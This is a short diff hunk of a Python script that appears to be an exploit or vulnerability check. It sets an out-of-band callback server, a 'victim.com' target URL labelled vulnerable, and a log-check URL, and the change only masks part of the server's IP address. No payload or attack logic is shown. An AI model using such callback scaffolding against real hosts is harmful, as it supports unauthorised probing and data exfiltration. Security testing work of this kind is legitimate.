@@ -1,7 +1,7 @@
 import requests
 import time
 
-oob_server = 'http://104.225.xxx.18:8888/'       # OOB Server
+oob_server = 'http://104.225.xxx.xx:8888/'       # OOB Server
 target_url = "http://victim.com:8443/vuln"      # vulnerable host
 check_url = oob_server + 'checklog'
 
